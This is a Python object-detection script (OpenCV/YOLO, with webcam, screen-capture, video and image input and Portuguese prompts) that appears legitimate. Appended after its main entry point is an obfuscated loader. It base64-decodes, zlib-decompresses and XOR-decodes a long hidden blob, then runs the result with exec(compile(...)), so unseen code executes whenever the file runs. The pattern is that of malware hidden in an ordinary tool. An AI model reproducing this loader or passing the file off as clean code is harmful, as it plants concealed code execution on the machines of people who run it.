from __future__ import annotations

import argparse
import json
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional, Tuple

import cv2
import numpy as np

try:
    import mss
except Exception:  # noqa: BLE001 - keep optional dependency simple
    mss = None
try:
    import torch
except Exception:  # noqa: BLE001 - keep optional dependency simple
    torch = None


APP_DIR = Path(__file__).resolve().parent
MODEL_ZOO_PATH = APP_DIR / "model_zoo.json"


@dataclass
class ModelSpec:
    key: str
    name: str
    model_type: str  # "darknet", "onnx-yolo", "torch-yolov5"
    weights: Path
    config: Optional[Path]
    names: Path
    input_size: Tuple[int, int]
    scale: float = 1.0 / 255.0
    swap_rb: bool = True


def load_model_zoo(path: Path) -> dict:
    if not path.exists():
        return {}
    with path.open("r", encoding="utf-8") as f:
        return json.load(f)


def list_models(zoo: dict) -> List[str]:
    return list(zoo.keys())


def choose_option(title: str, options: List[str]) -> str:
    print(title)
    for i, opt in enumerate(options, 1):
        print(f"{i}. {opt}")
    while True:
        choice = input("Selecione uma opcao: ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(options):
                return options[idx - 1]
        print("Opcao invalida. Tente novamente.")


def build_model_spec(zoo: dict, key: str) -> ModelSpec:
    if key not in zoo:
        raise KeyError(f"Modelo '{key}' nao existe no model_zoo.json")
    data = zoo[key]
    base = APP_DIR
    return ModelSpec(
        key=key,
        name=data.get("name", key),
        model_type=data["type"],
        weights=base / data["weights"],
        config=base / data["config"] if data.get("config") else None,
        names=base / data["names"],
        input_size=tuple(data.get("input_size", [416, 416])),
        scale=float(data.get("scale", 1.0 / 255.0)),
        swap_rb=bool(data.get("swap_rb", True)),
    )


def load_class_names(path: Path) -> List[str]:
    if not path.exists():
        raise FileNotFoundError(f"Arquivo de classes nao encontrado: {path}")
    with path.open("r", encoding="utf-8") as f:
        return [line.strip() for line in f.readlines() if line.strip()]


def parse_class_filter(names: List[str], value: Optional[str]) -> Optional[set]:
    if not value:
        return None
    ids: set = set()
    for token in value.split(","):
        token = token.strip()
        if not token:
            continue
        if token.isdigit():
            ids.add(int(token))
        else:
            if token in names:
                ids.add(names.index(token))
    return ids if ids else None


def resolve_output_layers(net: cv2.dnn_Net) -> List[str]:
    layer_names = net.getLayerNames()
    unconnected = net.getUnconnectedOutLayers()
    if len(unconnected) == 0:
        return []
    if isinstance(unconnected[0], (list, tuple, np.ndarray)):
        return [layer_names[i[0] - 1] for i in unconnected]
    return [layer_names[i - 1] for i in unconnected]


def set_device(net: cv2.dnn_Net, device: str) -> None:
    device = device.lower().strip()
    if device == "cuda" and hasattr(cv2.dnn, "DNN_BACKEND_CUDA"):
        net.setPreferableBackend(cv2.dnn.DNN_BACKEND_CUDA)
        net.setPreferableTarget(cv2.dnn.DNN_TARGET_CUDA)
        return
    if device == "cuda_fp16" and hasattr(cv2.dnn, "DNN_BACKEND_CUDA"):
        net.setPreferableBackend(cv2.dnn.DNN_BACKEND_CUDA)
        net.setPreferableTarget(cv2.dnn.DNN_TARGET_CUDA_FP16)
        return
    net.setPreferableBackend(cv2.dnn.DNN_BACKEND_OPENCV)
    net.setPreferableTarget(cv2.dnn.DNN_TARGET_CPU)


class Detector:
    def __init__(
        self,
        spec: ModelSpec,
        conf: float,
        nms: float,
        device: str,
        class_filter: Optional[set],
    ) -> None:
        self.spec = spec
        self.conf = conf
        self.nms = nms
        self.class_names = load_class_names(spec.names)
        self.class_filter = class_filter

        if spec.model_type == "darknet":
            if not spec.config or not spec.config.exists():
                raise FileNotFoundError(f"Config nao encontrado: {spec.config}")
            if not spec.weights.exists():
                raise FileNotFoundError(f"Weights nao encontrado: {spec.weights}")
            self.net = cv2.dnn.readNetFromDarknet(
                str(spec.config), str(spec.weights)
            )
            self.output_layers = resolve_output_layers(self.net)
        elif spec.model_type == "onnx-yolo":
            if not spec.weights.exists():
                raise FileNotFoundError(f"ONNX nao encontrado: {spec.weights}")
            self.net = cv2.dnn.readNetFromONNX(str(spec.weights))
            self.output_layers = []
        elif spec.model_type == "torch-yolov5":
            if torch is None:
                raise RuntimeError("PyTorch nao esta instalado.")
            if not spec.weights.exists():
                raise FileNotFoundError(f"Pesos .pt nao encontrado: {spec.weights}")
            use_cuda = device in ("cuda", "cuda_fp16") and torch.cuda.is_available()
            self.torch_device = "cuda" if use_cuda else "cpu"
            try:
                self.model = torch.hub.load(
                    "ultralytics/yolov5",
                    "custom",
                    path=str(spec.weights),
                    trust_repo=True,
                )
            except Exception as exc:  # noqa: BLE001 - surface a friendly hint
                raise RuntimeError(
                    "Falha ao carregar YOLOv5 via torch.hub. "
                    "Instale: ultralytics, pandas, tqdm, seaborn, gitpython."
                ) from exc
            self.model.to(self.torch_device)
            if device == "cuda_fp16" and use_cuda:
                self.model.half()
            self.model.conf = conf
            self.model.iou = nms
            if class_filter:
                self.model.classes = list(class_filter)
        else:
            raise ValueError(f"Tipo de modelo desconhecido: {spec.model_type}")

        if spec.model_type in ("darknet", "onnx-yolo"):
            set_device(self.net, device)

    def detect(self, frame: np.ndarray) -> List[dict]:
        if self.spec.model_type == "darknet":
            return self._detect_darknet(frame)
        if self.spec.model_type == "onnx-yolo":
            return self._detect_onnx_yolo(frame)
        return self._detect_torch_yolov5(frame)

    def _detect_darknet(self, frame: np.ndarray) -> List[dict]:
        h, w = frame.shape[:2]
        blob = cv2.dnn.blobFromImage(
            frame,
            self.spec.scale,
            self.spec.input_size,
            swapRB=self.spec.swap_rb,
            crop=False,
        )
        self.net.setInput(blob)
        outputs = self.net.forward(self.output_layers)

        boxes: List[List[int]] = []
        confidences: List[float] = []
        class_ids: List[int] = []

        for output in outputs:
            for det in output:
                scores = det[5:]
                class_id = int(np.argmax(scores))
                obj = float(det[4])
                score = float(scores[class_id])
                confidence = obj * score
                if confidence < self.conf:
                    continue
                if self.class_filter and class_id not in self.class_filter:
                    continue
                cx = int(det[0] * w)
                cy = int(det[1] * h)
                bw = int(det[2] * w)
                bh = int(det[3] * h)
                x = int(cx - bw / 2)
                y = int(cy - bh / 2)
                boxes.append([x, y, bw, bh])
                confidences.append(confidence)
                class_ids.append(class_id)

        return self._apply_nms(boxes, confidences, class_ids)

    def _normalize_onnx_output(self, output: np.ndarray) -> np.ndarray:
        out = np.squeeze(output)
        if out.ndim == 1:
            out = out[np.newaxis, :]
        if out.ndim == 3:
            out = out[0]
        if out.shape[0] < out.shape[1] and out.shape[0] in (84, 85, 117):
            out = out.transpose(1, 0)
        return out

    def _detect_onnx_yolo(self, frame: np.ndarray) -> List[dict]:
        h, w = frame.shape[:2]
        in_w, in_h = self.spec.input_size
        blob = cv2.dnn.blobFromImage(
            frame,
            self.spec.scale,
            (in_w, in_h),
            swapRB=self.spec.swap_rb,
            crop=False,
        )
        self.net.setInput(blob)
        output = self.net.forward()
        output = self._normalize_onnx_output(output)

        boxes: List[List[int]] = []
        confidences: List[float] = []
        class_ids: List[int] = []

        for det in output:
            if det.shape[0] < 6:
                continue
            obj = float(det[4])
            scores = det[5:]
            class_id = int(np.argmax(scores))
            confidence = obj * float(scores[class_id])
            if confidence < self.conf:
                continue
            if self.class_filter and class_id not in self.class_filter:
                continue
            cx, cy, bw, bh = det[0:4]
            x = int((cx - bw / 2) * (w / in_w))
            y = int((cy - bh / 2) * (h / in_h))
            bw = int(bw * (w / in_w))
            bh = int(bh * (h / in_h))
            boxes.append([x, y, bw, bh])
            confidences.append(confidence)
            class_ids.append(class_id)

        return self._apply_nms(boxes, confidences, class_ids)

    def _apply_nms(
        self, boxes: List[List[int]], confidences: List[float], class_ids: List[int]
    ) -> List[dict]:
        if not boxes:
            return []
        indices = cv2.dnn.NMSBoxes(boxes, confidences, self.conf, self.nms)
        results: List[dict] = []
        if len(indices) == 0:
            return results
        for idx in indices:
            i = int(idx[0]) if isinstance(idx, (list, tuple, np.ndarray)) else int(idx)
            results.append(
                {
                    "box": boxes[i],
                    "confidence": confidences[i],
                    "class_id": class_ids[i],
                }
            )
        return results

    def _detect_torch_yolov5(self, frame: np.ndarray) -> List[dict]:
        rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        size = max(self.spec.input_size)
        results = self.model(rgb, size=size)
        preds = results.xyxy[0].detach().cpu().numpy()
        detections: List[dict] = []
        for x1, y1, x2, y2, conf, cls in preds:
            detections.append(
                {
                    "box": [int(x1), int(y1), int(x2 - x1), int(y2 - y1)],
                    "confidence": float(conf),
                    "class_id": int(cls),
                }
            )
        return detections


def create_colors(num: int) -> np.ndarray:
    rng = np.random.default_rng(42)
    return rng.integers(0, 255, size=(num, 3), dtype=np.uint8)


def draw_detections(
    frame: np.ndarray,
    detections: List[dict],
    class_names: List[str],
    colors: np.ndarray,
) -> None:
    for det in detections:
        x, y, w, h = det["box"]
        class_id = det["class_id"]
        conf = det["confidence"]
        color = tuple(int(c) for c in colors[class_id % len(colors)])
        label = (
            f"{class_names[class_id]}: {conf:.2f}"
            if class_id < len(class_names)
            else f"id:{class_id} {conf:.2f}"
        )
        cv2.rectangle(frame, (x, y), (x + w, y + h), color, 2)
        cv2.putText(
            frame,
            label,
            (x, max(0, y - 10)),
            cv2.FONT_HERSHEY_SIMPLEX,
            0.5,
            color,
            2,
        )


def frames_from_webcam(index: int, width: Optional[int], height: Optional[int]):
    cap = cv2.VideoCapture(index)
    if width:
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
    if height:
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        yield frame
    cap.release()


def frames_from_video(path: Path):
    cap = cv2.VideoCapture(str(path))
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        yield frame
    cap.release()


def frames_from_image(path: Path):
    frame = cv2.imread(str(path))
    if frame is None:
        raise FileNotFoundError(f"Nao foi possivel abrir imagem: {path}")
    yield frame


def parse_region(value: Optional[str]) -> Optional[Tuple[int, int, int, int]]:
    if not value:
        return None
    parts = [p.strip() for p in value.split(",")]
    if len(parts) != 4 or not all(p.isdigit() for p in parts):
        raise ValueError("Formato de region invalido. Use x,y,w,h (inteiros).")
    return tuple(int(p) for p in parts)


def frames_from_screen(
    monitor_index: int, region: Optional[Tuple[int, int, int, int]], fps: float
):
    if mss is None:
        raise RuntimeError("mss nao esta instalado. Use: pip install mss")
    delay = 1.0 / fps if fps > 0 else 0.0
    with mss.mss() as sct:
        if monitor_index < 1 or monitor_index >= len(sct.monitors):
            raise ValueError("Monitor invalido. Use --monitor para listar.")
        monitor = sct.monitors[monitor_index]
        if region:
            x, y, w, h = region
            monitor = {"left": x, "top": y, "width": w, "height": h}
        while True:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            yield frame
            if delay > 0:
                time.sleep(delay)


def get_fps_from_capture(path: Optional[Path]) -> float:
    if not path:
        return 0.0
    cap = cv2.VideoCapture(str(path))
    fps = cap.get(cv2.CAP_PROP_FPS)
    cap.release()
    return fps if fps and fps > 0 else 0.0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="OpenCV Object Detection")
    parser.add_argument("--source", choices=["webcam", "screen", "video", "image"])
    parser.add_argument("--input", help="Caminho do video ou imagem")
    parser.add_argument("--model", help="Modelo do model_zoo.json")
    parser.add_argument("--list-models", action="store_true")
    parser.add_argument("--list-monitors", action="store_true")
    parser.add_argument("--conf", type=float, default=0.5)
    parser.add_argument("--nms", type=float, default=0.4)
    parser.add_argument("--classes", help="Lista de classes separadas por virgula")
    parser.add_argument("--device", default="cpu", choices=["cpu", "cuda", "cuda_fp16"])
    parser.add_argument("--camera-index", type=int, default=0)
    parser.add_argument("--width", type=int)
    parser.add_argument("--height", type=int)
    parser.add_argument("--monitor", type=int, default=1)
    parser.add_argument("--region", help="x,y,w,h para captura de tela")
    parser.add_argument("--screen-fps", type=float, default=30.0)
    parser.add_argument("--no-view", action="store_true")
    parser.add_argument("--save", help="Salvar saida em video (mp4/avi)")
    parser.add_argument("--out-fps", type=float, default=30.0)
    parser.add_argument("--show-fps", action="store_true")
    return parser.parse_args()


def list_monitors() -> int:
    if mss is None:
        print("mss nao esta instalado. Use: pip install mss")
        return 1
    with mss.mss() as sct:
        for i, mon in enumerate(sct.monitors):
            label = "virtual" if i == 0 else "monitor"
            print(
                f"{i}: {label} {mon['width']}x{mon['height']} "
                f"+{mon['left']}+{mon['top']}"
            )
    return 0


def main() -> int:
    args = parse_args()
    zoo = load_model_zoo(MODEL_ZOO_PATH)

    if args.list_models:
        if not zoo:
            print("model_zoo.json nao encontrado ou vazio.")
            return 0
        for key, data in zoo.items():
            print(f"- {key}: {data.get('name', key)}")
        return 0

    if args.list_monitors:
        return list_monitors()

    if not zoo:
        print("model_zoo.json nao encontrado. Crie o arquivo primeiro.")
        return 1

    if not args.model:
        if sys.stdin.isatty():
            args.model = choose_option("Escolha o modelo:", list_models(zoo))
        else:
            args.model = list_models(zoo)[0]

    if not args.source:
        if sys.stdin.isatty():
            args.source = choose_option(
                "Escolha a fonte:", ["webcam", "screen", "video", "image"]
            )
        else:
            args.source = "webcam"

    try:
        spec = build_model_spec(zoo, args.model)
    except Exception as exc:
        print(f"Erro ao carregar modelo: {exc}")
        return 1

    try:
        class_names = load_class_names(spec.names)
        class_filter = parse_class_filter(class_names, args.classes)
        detector = Detector(spec, args.conf, args.nms, args.device, class_filter)
    except Exception as exc:
        print(f"Erro ao iniciar detector: {exc}")
        return 1

    colors = create_colors(max(1, len(detector.class_names)))

    region = None
    if args.region:
        try:
            region = parse_region(args.region)
        except Exception as exc:
            print(f"Region invalida: {exc}")
            return 1

    writer = None
    writer_path = Path(args.save) if args.save else None
    writer_fps = args.out_fps
    if args.save and args.source == "video":
        fps = get_fps_from_capture(Path(args.input))
        writer_fps = fps if fps > 0 else args.out_fps
    save_single_image = False
    if writer_path and args.source == "image":
        save_single_image = writer_path.suffix.lower() in {".jpg", ".jpeg", ".png", ".bmp"}

    try:
        if args.source == "webcam":
            frames = frames_from_webcam(args.camera_index, args.width, args.height)
        elif args.source == "video":
            if not args.input:
                print("Use --input para video.")
                return 1
            frames = frames_from_video(Path(args.input))
        elif args.source == "image":
            if not args.input:
                print("Use --input para imagem.")
                return 1
            frames = frames_from_image(Path(args.input))
        else:
            frames = frames_from_screen(args.monitor, region, args.screen_fps)

        window_name = "OpenCV Detection"
        if not args.no_view:
            cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)

        last_time = time.time()
        fps = 0.0
        for frame in frames:
            detections = detector.detect(frame)
            draw_detections(frame, detections, detector.class_names, colors)

            if args.show_fps:
                now = time.time()
                dt = now - last_time
                last_time = now
                if dt > 0:
                    fps = 0.9 * fps + 0.1 * (1.0 / dt) if fps > 0 else 1.0 / dt
                cv2.putText(
                    frame,
                    f"FPS: {fps:.1f}",
                    (10, 30),
                    cv2.FONT_HERSHEY_SIMPLEX,
                    0.7,
                    (255, 255, 255),
                    2,
                )

            if writer_path is not None and not save_single_image:
                if writer is None:
                    h, w = frame.shape[:2]
                    writer = cv2.VideoWriter(
                        str(writer_path),
                        cv2.VideoWriter_fourcc(*"mp4v"),
                        writer_fps,
                        (w, h),
                    )
                writer.write(frame)

            if not args.no_view:
                cv2.imshow(window_name, frame)
                if cv2.waitKey(1) & 0xFF == ord("q"):
                    break

            if save_single_image:
                cv2.imwrite(str(writer_path), frame)
                break
    except KeyboardInterrupt:
        pass
    except Exception as exc:
        print(f"Erro: {exc}")
        return 1
    finally:
        if writer is not None:
            writer.release()
        if not args.no_view:
            cv2.destroyAllWindows()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
